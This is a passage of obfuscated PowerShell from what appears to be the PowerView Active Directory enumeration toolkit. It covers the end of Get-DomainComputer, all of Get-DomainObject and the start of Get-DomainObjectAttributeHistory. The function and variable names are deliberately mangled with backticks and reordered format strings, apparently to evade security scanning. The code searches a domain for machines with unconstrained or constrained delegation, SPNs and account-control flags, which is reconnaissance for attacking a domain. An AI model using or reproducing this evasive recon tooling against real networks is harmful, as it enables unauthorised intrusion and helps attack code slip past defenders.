        if (${psbo`UnD`Pa`RAmE`TerS}[("{0}{1}" -f'Serve','r')]) { ${S`EarChEra`RgU`ME`NTS}[("{2}{1}{0}"-f 'ver','er','S')] = ${Se`R`VeR} }
        if (${pSbouNDpaR`A`mE`T`ERs}[("{1}{0}{2}"-f 'c','Sear','hScope')]) { ${SeaRCh`E`RargUME`NTS}[("{0}{1}{2}" -f'Sear','chSco','pe')] = ${sE`ARcHsc`opE} }
        if (${pSBouND`p`A`RAMet`E`RS}[("{0}{2}{1}"-f 'Re','geSize','sultPa')]) { ${SEar`C`he`R`ARGUmeN`Ts}[("{1}{2}{0}" -f'ze','Resu','ltPageSi')] = ${res`Ul`TPAgESI`Ze} }
        if (${P`SBOuN`d`par`AmETErs}[("{3}{1}{0}{4}{2}"-f'rTimeLi','rve','t','Se','mi')]) { ${sEaRch`E`RAR`gUMeNTS}[("{3}{1}{0}{2}" -f 'eLi','m','mit','ServerTi')] = ${SErVER`Tim`e`liMiT} }
        if (${PS`BOu`NDpAr`A`M`etERs}[("{0}{1}{2}"-f'SecurityM','as','ks')]) { ${S`eArch`e`RAr`guMeNts}[("{1}{0}{2}" -f'curityM','Se','asks')] = ${Sec`Urit`Y`mAsks} }
        if (${pS`B`oun`d`p`ARameTErs}[("{2}{0}{1}"-f 'bs','tone','Tom')]) { ${s`EarC`herARGum`EN`TS}[("{1}{2}{0}"-f'bstone','To','m')] = ${T`oMbs`To`Ne} }
        if (${p`SbOUn`dPAraM`Et`e`RS}[("{0}{1}{2}"-f 'Cr','ede','ntial')]) { ${s`EA`RChE`R`ArgUmENts}[("{0}{1}{2}"-f'Creden','t','ial')] = ${CRe`DenTI`Al} }
        ${cOmpsE`A`Rc`HEr} = &("{2}{5}{3}{0}{1}{4}"-f 'main','Searc','Get','o','her','-D') @SearcherArguments
    }

    PROCESS {
        
        if (${pSbOUNdpa`R`AMETe`RS} -and (${Psb`ounDpa`RameTe`RS}."co`UnT" -ne 0)) {
            &("{4}{2}{1}{3}{0}" -f'r','e','DynamicParam','te','New-') -CreateVariables -BoundParameters ${pS`BOUndpAr`AM`ete`RS}
        }

        if (${Co`M`psEaRcheR}) {
            ${id`ENt`ItYfiL`Ter} = ''
            ${Fi`LT`Er} = ''
            ${I`DentI`Ty} | &("{2}{0}{1}"-f 're-Obje','ct','Whe') {${_}} | &("{3}{0}{1}{2}"-f'ach','-O','bject','ForE') {
                ${IDE`NTItYin`St`AN`Ce} = ${_}.("{0}{1}"-f'Repl','ace').Invoke('(', '\28').("{0}{2}{1}"-f 'Re','lace','p').Invoke(')', '\29')
                if (${i`dEn`Ti`TyInStAn`cE} -match ("{0}{1}"-f'^S-','1-')) {
                    ${IDENT`ItyFI`L`TEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${ide`NtIt`yINsta`NCE} -match ("{0}{1}" -f '^CN','=')) {
                    ${idE`NtItYFiLT`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSB`ouND`pa`RamETErS}[("{1}{2}{0}" -f 'n','Do','mai')]) -and (-not ${pS`BoU`NDPAr`AM`eTERS}[("{1}{2}{3}{0}"-f 'e','Search','Ba','s')])) {
                        
                        
                        ${idE`NTIty`DOma`iN} = ${iDe`NTi`Tyins`TaNce}.("{1}{0}{2}"-f 'ubS','S','tring').Invoke(${I`D`ENTiTyinSt`ANCe}.("{0}{1}{2}" -f 'I','n','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{2}{3}{1}"-f 'Write','se','-','Verbo') ('[Get-Do'+'ma'+'inCom'+'p'+'uter'+']'+' '+'Ext'+'racted'+' '+'d'+'omain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${Sear`cheRa`Rg`UmeN`TS}[("{2}{0}{1}" -f'a','in','Dom')] = ${IDe`NtI`TYdO`M`AiN}
                        ${c`oMpsea`RChER} = &("{4}{3}{0}{2}{1}"-f'ainSe','r','arche','et-Dom','G') @SearcherArguments
                        if (-not ${COM`p`SEAr`c`her}) {
                            &("{2}{4}{3}{1}{0}" -f'ing','rn','Write-','a','W') ('[Get-DomainC'+'o'+'m'+'put'+'e'+'r] '+'U'+'nabl'+'e '+'t'+'o '+'re'+'trieve'+' '+'doma'+'i'+'n '+'sea'+'r'+'cher '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${i`d`eNTiT`yi`NSTaNce}.("{2}{0}{1}" -f'a','ins','Cont').Invoke('.')) {
                    ${I`dEn`T`ITyfi`lTEr} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${ide`Nt`IT`YiNStaNcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gu`IDB`y`TestrinG} = (([Guid]${Id`EntIt`YIN`sTA`N`CE}).("{1}{3}{2}{0}"-f'eArray','To','t','By').Invoke() | &("{0}{1}{2}{3}" -f'ForE','ach-','O','bject') { '\' + ${_}.("{0}{2}{1}" -f 'ToStr','ng','i').Invoke('X2') }) -join ''
                    ${Id`E`Nt`ItYfILTer} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${Id`Enti`TyFILTer} += "(name=$IdentityInstance)"
                }
            }
            if (${ide`N`TI`TYFilt`Er} -and (${i`deN`TiTYf`iltEr}.("{1}{0}"-f'rim','T').Invoke() -ne '') ) {
                ${f`iL`TeR} += "(|$IdentityFilter)"
            }

            if (${PsBOun`dP`ARa`MeTErS}[("{1}{0}{2}" -f'nco','U','nstrained')]) {
                &("{2}{0}{3}{1}"-f 'te-','e','Wri','Verbos') ("{2}{11}{6}{7}{12}{8}{4}{9}{10}{1}{0}{3}{5}" -f 'strained del','n','[Get-D','ega','mp','tion','ter',']',' for co','uters',' with for unco','omainCompu',' Searching')
                ${fiL`TER} += ("{5}{9}{6}{3}{12}{8}{1}{4}{7}{0}{11}{13}{2}{10}" -f'4.803','1.2.84','28','ccou','0.1','(u','erA','13556.1.','ol:','s','8)',':=5','ntContr','24')
            }
            if (${psB`oUND`PAr`AmETERs}[("{2}{1}{0}" -f'h','oAut','TrustedT')]) {
                &("{3}{0}{1}{2}" -f'-V','erb','ose','Write') ("{21}{13}{25}{14}{12}{23}{8}{11}{24}{4}{27}{28}{2}{20}{16}{15}{19}{7}{22}{9}{6}{1}{5}{10}{26}{17}{18}{3}{0}"-f'ls','othe',' ','a','rs th','r',' ','t','for','for',' p',' ','mp','et-','nCo','ut','ed to a','i','p','hen','are trust','[G','icate ','uter] Searching ','compute','Domai','rinc','a','t')
                ${fi`lTeR} += ("{1}{6}{0}{4}{2}{5}{3}" -f 'ed','(','delega',')','to','teto=*','msds-allow')
            }
            if (${pS`BOUnD`P`ARame`TERS}[("{1}{0}{2}" -f 'e','Print','rs')]) {
                &("{0}{1}{2}{4}{3}" -f'Wri','te','-','e','Verbos') ("{1}{6}{9}{5}{7}{3}{0}{2}{8}{4}" -f ' for pri','[Get-','n','g','rs','Compu','Dom','ter] Searchin','te','ain')
                ${Fil`Ter} += (("{4}{5}{1}{3}{0}{2}"-f'rintQue','egory','ue)','=p','(obj','ectCat'))
            }
            if (${P`sB`ou`N`dParametErS}['SPN']) {
                &("{2}{1}{0}"-f'ose','b','Write-Ver') ('['+'Get-Domain'+'Comp'+'uter] '+'Sea'+'rch'+'ing '+'fo'+'r '+'co'+'mp'+'ute'+'rs '+'w'+'ith '+'S'+'PN: '+"$SPN")
                ${Fil`TeR} += "(servicePrincipalName=$SPN)"
            }
            if (${psBo`UNdpA`RaMETe`Rs}[("{1}{0}{3}{2}" -f 'per','O','gSystem','atin')]) {
                &("{4}{1}{3}{0}{2}"-f 'b','-','ose','Ver','Write') ('[Get-Doma'+'in'+'C'+'o'+'mput'+'er] '+'Se'+'a'+'rching '+'for'+' '+'co'+'mpute'+'rs'+' '+'wi'+'th '+'op'+'e'+'rating '+'syst'+'e'+'m: '+"$OperatingSystem")
                ${fIl`T`ER} += "(operatingsystem=$OperatingSystem)"
            }
            if (${psB`ou`Ndpara`mEteRs}[("{2}{1}{0}" -f 'k','icePac','Serv')]) {
                &("{3}{2}{1}{0}" -f'e','rbos','te-Ve','Wri') ('['+'Get'+'-DomainCo'+'mp'+'ut'+'er] '+'Sear'+'chi'+'ng '+'f'+'or '+'com'+'puters'+' '+'wit'+'h '+'servic'+'e'+' '+'p'+'ack:'+' '+"$ServicePack")
                ${FIL`TeR} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${PsbOUnDp`ARA`ME`TERS}[("{1}{0}"-f'ame','SiteN')]) {
                &("{3}{0}{2}{1}" -f 'r','rbose','ite-Ve','W') ('[Get-Do'+'m'+'ain'+'C'+'o'+'mputer] '+'Sea'+'r'+'c'+'hing '+'fo'+'r '+'com'+'p'+'uters '+'wit'+'h '+'site'+' '+'name:'+' '+"$SiteName")
                ${FI`LTER} += "(serverreferencebl=$SiteName)"
            }
            if (${ps`BoUNdpARa`me`TErs}[("{1}{0}{2}" -f'l','LDAPFi','ter')]) {
                &("{0}{3}{1}{2}"-f'Write-','er','bose','V') ('[Get-'+'DomainCo'+'mpute'+'r'+']'+' '+'Using'+' '+'addi'+'tional'+' '+'LDAP'+' '+'filter'+':'+' '+"$LDAPFilter")
                ${FI`LtER} += "$LDAPFilter"
            }
            
            ${UAcF`I`LteR} | &("{2}{1}{0}"-f 't','Objec','Where-') {${_}} | &("{3}{2}{0}{1}" -f'ach-Objec','t','rE','Fo') {
                if (${_} -match ("{2}{0}{1}"-f'T_','.*','NO')) {
                    ${uAC`F`I`eLD} = ${_}.("{0}{1}" -f 'Sub','string').Invoke(4)
                    ${Ua`cVA`LUE} = [Int](${u`ACEnUm}::${Ua`CfielD})
                    ${F`ilT`Er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uaC`VA`luE} = [Int](${u`Ac`ENUm}::${_})
                    ${F`iLter} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${co`M`pSEARc`heR}."fI`Lter" = "(&(samAccountType=805306369)$Filter)"
            &("{3}{2}{0}{1}"-f'erb','ose','te-V','Wri') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${p`s`BoUnDpA`R`AmeTeRs}[("{0}{1}"-f 'FindO','ne')]) { ${RESu`L`Ts} = ${com`ps`eaRC`HeR}.("{0}{1}" -f'Fin','dOne').Invoke() }
            else { ${Re`SU`lTs} = ${COmPsEa`R`ChEr}.("{0}{1}{2}" -f 'F','in','dAll').Invoke() }
            ${re`sU`lTS} | &("{2}{0}{1}"-f'her','e-Object','W') {${_}} | &("{2}{0}{1}" -f'j','ect','ForEach-Ob') {
                ${U`p} = ${t`Rue}
                if (${pSB`O`UN`dPaRa`me`Ters}[("{1}{0}"-f'ing','P')]) {
                    ${u`p} = &("{1}{3}{2}{0}" -f'Connection','Tes','-','t') -Count 1 -Quiet -ComputerName ${_}."p`RO`pE`RTiEs"."d`NShoStNa`Me"
                }
                if (${Up}) {
                    if (${psBO`UNDp`ARa`ME`Ters}['Raw']) {
                        
                        ${COm`Pu`TEr} = ${_}
                        ${CO`MPuteR}."PSO`BjE`ct"."TYP`EnA`m`ES".("{0}{1}" -f'Inser','t').Invoke(0, ("{6}{1}{5}{0}{4}{2}{3}"-f 'ut','werView.','r.Ra','w','e','Comp','Po'))
                    }
                    else {
                        ${C`OmpuT`eR} = &("{1}{2}{3}{0}"-f 'erty','C','onvert-','LDAPProp') -Properties ${_}."P`R`opeRTies"
                        ${COm`pu`TEr}."P`s`OBjECt"."tyPen`Am`es".("{0}{1}" -f'Inse','rt').Invoke(0, ("{1}{0}{3}{2}"-f'owerVi','P','mputer','ew.Co'))
                    }
                    ${CO`mp`UTer}
                }
            }
            if (${RE`s`ULts}) {
                try { ${R`esUL`TS}.("{0}{2}{1}" -f 'di','e','spos').Invoke() }
                catch {
                    &("{2}{0}{1}" -f'erbo','se','Write-V') ('[Ge'+'t-Do'+'mainCo'+'mput'+'er] '+'Err'+'or '+'dis'+'po'+'sing '+'of'+' '+'t'+'he '+'Resu'+'l'+'ts '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${C`O`m`PSeaRcheR}.("{1}{0}{2}"-f 'sp','di','ose').Invoke()
        }
    }
}


function GE`T`-`dOmAiNObj`eCt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{5}{8}{4}{9}{3}{2}{6}{7}{0}"-f 'ts','P','sMoreTh','redVar','Dec','S','anAssign','men','Use','la'}, '')]
    [OutputType({"{0}{3}{2}{1}"-f'Pow','bject','DO','erView.A'})]
    [OutputType({"{4}{5}{0}{3}{2}{1}{6}" -f '.','Objec','D','A','PowerVi','ew','t.Raw'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITiOn = 0, vaLUEFroMpIPeLIne = ${Tr`Ue}, valueFrOmpIPELInebypROPErtYName = ${t`RUe})]
        [Alias({"{4}{3}{0}{2}{1}"-f'nguish','Name','ed','isti','D'}, {"{3}{0}{4}{2}{1}" -f 'Acc','e','Nam','Sam','ount'}, {"{0}{1}" -f'Nam','e'}, {"{0}{1}{4}{5}{2}{3}{6}" -f 'Me','mb','isti','ngui','e','rD','shedName'}, {"{0}{2}{1}"-f'Mem','e','berNam'})]
        [String[]]
        ${idEN`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'F','ilter'})]
        [String]
        ${LdA`pfi`Lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROPER`TI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'th','AD','SPa'})]
        [String]
        ${Se`AR`cHBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{3}{1}{0}"-f'ller','ontro','main','C','Do'})]
        [String]
        ${SE`RveR},

        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{0}{1}" -f 'On','eLevel'}, {"{1}{2}{0}"-f 'e','S','ubtre'})]
        [String]
        ${s`e`A`RchscoPe} = ("{0}{1}{2}"-f 'S','ubtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resUltpa`Ge`sIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVertI`M`eLI`mIT},

        [ValidateSet({"{1}{0}"-f 'acl','D'}, {"{1}{0}" -f'oup','Gr'}, {"{0}{1}"-f 'N','one'}, {"{1}{0}"-f 'ner','Ow'}, {"{1}{0}" -f'cl','Sa'})]
        [String]
        ${seC`UrIT`ymaskS},

        [Switch]
        ${T`o`M`BSTonE},

        [Alias({"{1}{3}{2}{0}"-f 'e','Ret','n','urnO'})]
        [Switch]
        ${f`I`NDoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`eNt`IAl} =  ( &("{2}{1}{0}"-f 'le','B','Get-VARiA') ("Jh3"+"Xo6")  )."VAL`Ue"::"emP`Ty",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${uA`Cva`lUEna`MEs} =   (&("{2}{3}{4}{0}{1}" -f 'LD','iTem','g','e','t-cHi') ("vA"+"R"+"iAblE:1qYBI")  )."v`Alue"::("{2}{0}{1}"-f'ame','s','GetN').Invoke(${uA`cEN`Um})
        
        ${Uac`V`AlUENa`Mes} = ${uAC`Va`LUeNa`m`eS} | &("{1}{3}{0}{2}" -f'Ob','ForEac','ject','h-') {${_}; "NOT_$_"}
        
        &("{0}{1}{4}{3}{5}{2}" -f'N','ew','ter','Dyn','-','amicParame') -Name ("{1}{2}{0}" -f 'Filter','U','AC') -ValidateSet ${UaC`V`Al`UenAM`ES} -Type ([array])
    }

    BEGIN {
        ${S`earCH`ErA`RGuM`EnTs} = @{}
        if (${pSboU`NdPARAMet`E`RS}[("{0}{2}{1}"-f'Dom','n','ai')]) { ${S`eArChE`Rarg`U`M`eNTS}[("{1}{0}"-f 'ain','Dom')] = ${Dom`A`In} }
        if (${PsBo`U`N`dp`A`RaMEtErS}[("{0}{1}{2}" -f'Pr','ope','rties')]) { ${SEarcHERA`RG`U`m`EntS}[("{1}{2}{0}" -f'ties','Prop','er')] = ${p`ROpe`R`TIes} }
        if (${PSb`Ou`Nd`P`ArAME`TerS}[("{2}{0}{3}{1}"-f 'r','e','Sea','chBas')]) { ${se`ArC`HERARgUMe`N`Ts}[("{1}{0}{2}"-f 'rchB','Sea','ase')] = ${Se`A`RcHBA`Se} }
        if (${P`SBoU`NDPA`R`AmeTErs}[("{1}{0}"-f'ver','Ser')]) { ${s`eARC`he`RArgumENTs}[("{2}{0}{1}" -f'erv','er','S')] = ${SEr`V`ER} }
        if (${PSB`OuNd`PaRAME`TeRs}[("{3}{1}{2}{0}"-f'ope','arc','hSc','Se')]) { ${Searc`H`eR`ArGuMEN`Ts}[("{0}{2}{1}{3}" -f 'S','op','earchSc','e')] = ${S`EarcHSC`O`PE} }
        if (${p`S`Bo`U`N`DpARAmETErs}[("{0}{1}{2}{3}{4}" -f'Res','u','lt','PageSi','ze')]) { ${searChE`R`ARgUMEn`Ts}[("{3}{0}{2}{1}"-f 'es','eSize','ultPag','R')] = ${REsuLT`p`AGEsIZE} }
        if (${Ps`BoUNDPAR`A`mEteRs}[("{0}{3}{4}{1}{2}"-f 'Se','i','mit','rverTime','L')]) { ${s`earCH`eRARgu`M`eNTS}[("{1}{3}{2}{0}"-f'meLimit','S','i','erverT')] = ${s`ERv`ErtiM`ELI`miT} }
        if (${P`sbOUNdpARAME`T`e`Rs}[("{0}{3}{2}{1}"-f 'S','tyMasks','ri','ecu')]) { ${sear`C`heRaRg`UME`NTS}[("{4}{3}{1}{2}{0}"-f'sks','u','rityMa','c','Se')] = ${SEcu`Ri`TymAs`kS} }
        if (${PSBo`UNd`p`ARaMet`ERS}[("{0}{1}"-f'To','mbstone')]) { ${sEArc`H`ERa`RgUMe`Nts}[("{1}{0}{2}"-f 'ombston','T','e')] = ${t`omBs`TONE} }
        if (${PSb`OUn`DPA`RameteRs}[("{1}{0}{2}"-f 'ed','Cr','ential')]) { ${s`e`ArChEr`ARgume`NTS}[("{2}{0}{1}"-f'reden','tial','C')] = ${cre`DEN`TiaL} }
        ${O`BjEc`TSEA`RCHeR} = &("{1}{2}{3}{4}{0}" -f'r','Get','-Dom','a','inSearche') @SearcherArguments
    }

    PROCESS {
        
        if (${pSB`OU`NDpAr`A`Me`TERs} -and (${pSbOUn`d`PaR`AME`TErS}."C`oUnt" -ne 0)) {
            &("{0}{3}{2}{1}" -f 'New','r','e','-DynamicParamet') -CreateVariables -BoundParameters ${PS`Bo`U`NDPARA`M`etERS}
        }
        if (${obJ`eCt`Sea`RcH`er}) {
            ${IDENTi`Tyf`ILtEr} = ''
            ${Fi`l`TER} = ''
            ${iDeNT`i`TY} | &("{0}{3}{2}{1}" -f'Whe','ct','e-Obje','r') {${_}} | &("{1}{0}{3}{2}"-f'or','F','-Object','Each') {
                ${IdE`N`TitYin`stA`NCE} = ${_}.("{1}{0}"-f 'e','Replac').Invoke('(', '\28').("{1}{2}{0}"-f'e','Repl','ac').Invoke(')', '\29')
                if (${iD`EN`T`I`TYinSTANCE} -match ("{0}{1}" -f'^S','-1-')) {
                    ${iD`enTiTYfil`Ter} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`dEN`TIty`i`Nstance} -match ((("{1}{2}{0}"-f'DC)=','^(CN{0}','OU{0}'))-f[CHAr]124)) {
                    ${IdEnt`i`Ty`FIL`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`s`BOUNDPAr`A`Met`eRs}[("{0}{1}" -f 'D','omain')]) -and (-not ${Ps`BOUn`dpaR`AM`etE`Rs}[("{1}{0}{2}"-f 'earchB','S','ase')])) {
                        
                        
                        ${idENTiT`Y`d`OmAin} = ${Id`E`N`TItyinsTAn`CE}.("{1}{0}{2}"-f 'Stri','Sub','ng').Invoke(${I`dEN`T`iTyI`NsTA`NCe}.("{1}{0}" -f 'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{0}{4}{2}{1}" -f 'V','se','rbo','Write-','e') ('[Ge'+'t'+'-Doma'+'inO'+'bject'+'] '+'Ext'+'r'+'acted '+'domain'+' '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${sear`chE`RArgU`mEn`TS}[("{1}{0}"-f'omain','D')] = ${I`D`En`T`ItyDOMAIN}
                        ${o`Bj`E`CtSEaRcHeR} = &("{4}{3}{2}{0}{1}"-f'he','r','ainSearc','t-Dom','Ge') @SearcherArguments
                        if (-not ${Ob`JEC`T`SeArcHeR}) {
                            &("{1}{2}{0}"-f 'e-Warning','W','rit') ('[G'+'et-D'+'om'+'ainObj'+'ect]'+' '+'Una'+'bl'+'e '+'t'+'o '+'r'+'etrie'+'ve '+'doma'+'in '+'searc'+'her'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${Id`En`TItYin`ST`AncE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gU`IDBytEStrI`NG} = (([Guid]${IdENt`ITY`i`NST`AnCe}).("{0}{1}{2}" -f'T','oByte','Array').Invoke() | &("{3}{1}{0}{2}" -f 'b','Each-O','ject','For') { '\' + ${_}.("{0}{2}{1}"-f'T','tring','oS').Invoke('X2') }) -join ''
                    ${IdeN`T`ityF`IlTER} += "(objectguid=$GuidByteString)"
                }
                elseif (${ideNT`I`TyiN`StanCe}.("{1}{0}{2}"-f'on','C','tains').Invoke('\')) {
                    ${ConVerT`ED`IDENTi`TyI`Nstance} = ${IDenTi`TYi`Nst`A`NCE}.("{1}{0}"-f 'place','Re').Invoke('\28', '(').("{0}{1}" -f 'Repl','ace').Invoke('\29', ')') | &("{1}{0}{3}{4}{2}" -f'onve','C','me','rt-','ADNa') -OutputType ("{1}{2}{0}"-f 'ical','Ca','non')
                    if (${coNv`ErT`EDideN`T`ItY`iNsTanCe}) {
                        ${oBje`Ct`Dom`Ain} = ${c`onVERte`dI`Dent`ITYin`S`T`AnCE}.("{0}{2}{1}{3}" -f 'Su','S','b','tring').Invoke(0, ${COnV`Er`TeD`iDenTI`Tyi`N`staNce}.("{1}{0}"-f'xOf','Inde').Invoke('/'))
                        ${ObjECT`N`Ame} = ${I`d`entI`TYiNStANCe}.("{1}{0}" -f't','Spli').Invoke('\')[1]
                        ${Ide`N`TITy`FIlTer} += "(samAccountName=$ObjectName)"
                        ${S`eARCHEr`AR`GuM`ENts}[("{2}{1}{0}"-f'ain','om','D')] = ${OBJEc`T`dOM`Ain}
                        &("{1}{2}{0}{3}"-f 'rb','Wri','te-Ve','ose') ('[G'+'et-Doma'+'in'+'Object] '+'Ex'+'tract'+'ed '+'dom'+'ain'+' '+"'$ObjectDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${oB`jEC`TseA`RcH`eR} = &("{1}{0}{4}{3}{2}" -f't-D','Ge','er','ainSearch','om') @SearcherArguments
                    }
                }
                elseif (${IDeN`TityiNSt`AN`ce}.("{2}{0}{1}" -f 'onta','ins','C').Invoke('.')) {
                    ${IdENti`TyFI`L`TEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${iD`eNti`T`YfiL`TeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IDeNt`IT`Y`FI`Lter} -and (${i`DeNtITY`F`ILt`er}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${fILt`Er} += "(|$IdentityFilter)"
            }

            if (${p`S`B`oUnDPaR`A`meTers}[("{2}{1}{0}" -f 'r','te','LDAPFil')]) {
                &("{3}{1}{2}{0}{4}" -f'os','t','e-Verb','Wri','e') ('[Get-D'+'omai'+'nO'+'bje'+'c'+'t] '+'U'+'si'+'ng '+'add'+'ition'+'al '+'LDAP'+' '+'filt'+'er: '+"$LDAPFilter")
                ${f`iLTER} += "$LDAPFilter"
            }

            
            ${ua`cf`ilT`ER} | &("{0}{1}{2}"-f'W','here-Obje','ct') {${_}} | &("{1}{3}{4}{0}{2}" -f'e','F','ct','orEach-O','bj') {
                if (${_} -match ("{1}{0}"-f'*','NOT_.')) {
                    ${uaCf`I`e`lD} = ${_}.("{0}{1}{2}" -f 'Sub','str','ing').Invoke(4)
                    ${Uacv`AL`UE} = [Int](${uA`CEnuM}::${uAcf`IE`Ld})
                    ${FIL`T`Er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${u`Ac`VaLuE} = [Int](${u`AC`eNum}::${_})
                    ${f`Ilt`eR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${F`ilt`eR} -and ${fIl`TEr} -ne '') {
                ${oBJecTSE`ARc`h`Er}."F`I`lTer" = "(&$Filter)"
            }
            &("{2}{3}{0}{1}"-f 's','e','Wr','ite-Verbo') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${PS`BOund`pa`RAMEteRs}[("{0}{2}{1}"-f'Fi','One','nd')]) { ${REsU`LTS} = ${O`Bj`E`CtseAR`cHEr}.("{0}{1}"-f 'FindO','ne').Invoke() }
            else { ${reS`ULts} = ${o`BjE`c`Tsear`Cher}.("{0}{1}"-f'Fi','ndAll').Invoke() }
            ${Re`s`ULTS} | &("{3}{0}{2}{1}" -f'e','e-Object','r','Wh') {${_}} | &("{0}{1}{2}{3}" -f 'Fo','r','Each-Obj','ect') {
                if (${PSbOUnDPa`R`AmE`T`ERs}['Raw']) {
                    
                    ${O`B`JEcT} = ${_}
                    ${O`B`jECt}."pso`Bj`ecT"."tYPE`NA`meS".("{1}{2}{0}"-f't','Inse','r').Invoke(0, ("{2}{3}{1}{6}{5}{0}{4}"-f 't.','i','Po','werV','Raw','ADObjec','ew.'))
                }
                else {
                    ${Ob`je`CT} = &("{5}{2}{1}{0}{3}{4}"-f 'DAPProp','t-L','r','e','rty','Conve') -Properties ${_}."prope`RT`I`es"
                    ${oBj`E`cT}."pso`BJe`ct"."T`YpEnAM`Es".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{5}{0}{1}{4}{2}{3}" -f 'owe','r','Ob','ject','View.AD','P'))
                }
                ${o`BJeCT}
            }
            if (${Re`SUl`TS}) {
                try { ${R`esu`Lts}.("{2}{1}{0}"-f'ose','sp','di').Invoke() }
                catch {
                    &("{1}{2}{0}{3}" -f'Verbos','Wri','te-','e') ('[Get-Domai'+'nOb'+'je'+'ct] '+'Error'+' '+'d'+'ispo'+'sing '+'of'+' '+'the'+' '+'Result'+'s'+' '+'ob'+'ject: '+"$_")
                }
            }
            ${obJ`ec`Ts`EaRcheR}.("{0}{1}"-f'disp','ose').Invoke()
        }
    }
}


function G`E`T-D`O`MAiNOBJ`ec`Ta`TTRibu`TEHIstorY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{1}{5}{0}{3}{2}{4}"-f 'rsMoreTh','seDecl','ssignment','anA','s','aredVa','PSU'}, '')]
    [OutputType({"{1}{7}{0}{4}{8}{2}{3}{5}{6}"-f'j','PowerView.','tr','ib','ect','uteHis','tory','ADOb','At'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITION = 0, VAluefroMPIPElInE = ${tr`Ue}, vALUEFroMPipeliNeBYprOPeRtYNaMe = ${t`RuE})]
        [Alias({"{0}{2}{3}{1}{4}" -f 'Di','hedNa','stin','guis','me'}, {"{2}{3}{0}{4}{1}" -f'c','ntName','S','amA','cou'}, {"{1}{0}" -f 'ame','N'}, {"{1}{3}{2}{0}{5}{4}"-f'she','MemberD','stingui','i','Name','d'}, {"{1}{3}{2}{0}"-f'Name','Memb','r','e'})]
        [String[]]
        ${idEnt`i`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${Ldap`FIL`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`o`perTiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'SPath','AD'})]
        [String]
        ${s`EarChBA`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}{5}{4}"-f'Co','Do','nt','main','oller','r'})]
        [String]
        ${sE`RveR},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{0}{1}"-f 'OneLe','vel'}, {"{1}{0}{2}"-f't','Sub','ree'})]
        [String]
        ${se`ArCH`SCOPE} = ("{1}{0}" -f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`U`lTPA`GEsIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErv`ER`Timeli`mIt},

        [Switch]
        ${TOmB`Sto`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDe`N`T`IAL} =   ( &("{0}{2}{3}{1}"-f 'G','le','e','T-vaRiab') ('J'+'h'+'3xo6'))."VaL`Ue"::"em`PtY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sE`Arc`HEra`R`guments} = @{
            ("{1}{2}{0}" -f'ties','Prope','r')    =   ("{5}{3}{1}{4}{2}{0}" -f 'a','lattri','tadat','ds-rep','buteme','ms'),("{1}{0}{3}{2}"-f'i','d','e','stinguishednam')
            'Raw'           =   ${T`RUe}
        }
